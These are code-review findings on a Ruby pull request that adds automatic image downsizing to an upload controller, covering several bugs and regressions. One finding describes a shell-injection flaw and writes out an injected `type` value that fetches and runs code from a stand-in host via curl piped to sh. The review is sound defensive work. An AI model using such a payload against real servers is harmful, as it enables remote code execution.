findings.title: Second `self.downsize` definition silently replaces the width/height variant
findings.body:
Ruby has no method overloading. The `def self.downsize(from, to, dimensions, opts={})` at line 149 replaces the `downsize(from, to, max_width, max_height, opts={})` defined just above it.

Existing callers that pass width and height break. For example, `Upload.create_for` downsizes profile_background and card_background images with `OptimizedImage.downsize(file.path, file.path, width, height, allow_animation: ...)`:
- With 5 arguments the call raises `ArgumentError` (wrong number of arguments).
- With 4 positional arguments, `opts` becomes an Integer and `opts[:allow_animation]` raises `TypeError`.

Profile and card background uploads will fail. Give the percentage/geometry variant a distinct name (e.g. `downsize_to(dimensions)`), or have a single method accept either form.

findings.title: User-controlled `type` reaches a shell command via the tempfile path
findings.body:
For API URL uploads, the tempfile comes from `FileHelper.download(url, 10.megabytes, "discourse-upload-#{type}")`. `type` is the unvalidated `params.require(:type)`, so the tempfile path contains it verbatim; Tempfile only strips path separators.

This PR now passes `tempfile.path` to `OptimizedImage.downsize` for any type whenever the image exceeds `max_image_size_kb`. `convert_with` runs `instructions.join(" ")` through backticks with no escaping. A `type` such as `x;$(curl evil|sh);` therefore executes arbitrary shell commands on the server. The attacker only needs an API key and a URL pointing to a large `.png`.

Fix both sides:
- Whitelist `type`.
- Build the command without the shell (`Open3`/`system` with an argv array, or `Shellwords.escape` on each element).

findings.title: Large animated GIFs are flattened or not downsized; conversion failures are ignored
findings.body:
The behavior depends on `allow_animated_thumbnails`:
- **Disabled:** `downsize_instructions` uses `#{from}[0]`, so an oversized animated GIF is silently replaced by its first frame. The animation is lost without telling the user.
- **Enabled:** the call goes to `resize_instructions_animated`, which runs `gifsicle --resize-fit 80%`. gifsicle's `--resize-fit` expects WxH, not a percentage, so the command fails.

The boolean returned by `downsize` is ignored either way. The loop spends all 5 attempts re-running a failing command, then hands an oversized file to `Upload.create_for`.

Check the return value and break on failure. Compute an explicit WxH target for gifsicle, and keep animated images animated.

findings.title: SVG uploads are run through ImageMagick raster resize
findings.body:
`FileHelper.is_image?` accepts `.svg`, so an SVG larger than `max_image_size_kb` is fed to `convert ... -resize 80%> file.svg`. That rasterizes the vector image and writes it back to the `.svg` path, either failing or producing a bloated or corrupted file.

`OptimizedImage.create_for` deliberately special-cases SVG and copies it instead of resizing. This new path should skip SVGs the same way.

findings.title: Up to 5 synchronous ImageMagick passes on unbounded input in the request/defer thread
findings.body:
Every oversized image now goes through up to 5 full decode/resize/encode cycles plus ImageOptim, before the server applies any size check.

- For multipart uploads, the only 10MB cap is client-side JS, so a crafted request can send anything up to the web server's body limit.
- A small compressed image with huge pixel dimensions (decompression bomb) can use a lot of memory and CPU in each pass.
- The work runs either in the request thread (synchronous API) or in `Scheduler::Defer`, a single in-process queue, so a few large uploads stall all other deferred work in that process.

Repeated 80% lossy re-encodes also degrade JPEG quality cumulatively.

Enforce a server-side byte and pixel limit before converting. Compute the needed scale once (one pass), and consider moving the work to a background job.

findings.title: `tempfile.size` may be stale after the file is rewritten by path
findings.body:
`convert` and `ImageOptim.optimize_image!` rewrite the file by path. ImageOptim replaces the file by renaming a new temp file over the original, which creates a new inode.

The `Tempfile` object keeps its open descriptor on the old inode, so `Tempfile#size` (fstat on that fd) can report the pre-optimization size. The stale size has two effects:
- It drives the loop condition, which can trigger extra unnecessary downsizes.
- It is passed as `filesize` to `Upload.create_for`, which can store a wrong size or reject an image that now fits.

Use `File.size(tempfile.path)` after each conversion, or reopen the file.

findings.title: Client size limit hardcoded to 10MB, ignoring the max_attachment_size_kb / max_image_size_kb settings
findings.body:
`validateUploadedFile` previously used `max_<type>_size_kb`. It now uses a fixed `10 * 1024` for both images and attachments. Two regressions follow:
- Sites that set `max_attachment_size_kb` or `max_image_size_kb` above 10MB can no longer upload such files; the client blocks them.
- Attachments are never downsized, but now pass the client check whenever they are under 10MB and above the configured limit. They upload fully and are then rejected by the server with a less helpful error.

Keep using `max_attachment_size_kb` for attachments, and only relax the limit for images.

The 413 handler (line 246) likewise now always reports 10MB, even though a 413 comes from the web server's body limit, which is unrelated to this constant.

findings.title: No tests for auto-downsizing or the changed `downsize` signature
findings.body:
The PR changes the `optimize`/`downsize` signatures and adds a downsizing loop in `UploadsController#create_upload`, but adds no specs. A spec calling `OptimizedImage.downsize` with width and height would have caught the method-override bug immediately.

Add coverage for:
- Both `downsize` call forms.
- The controller loop: oversized image is reduced, conversion failure, animated GIF, SVG.
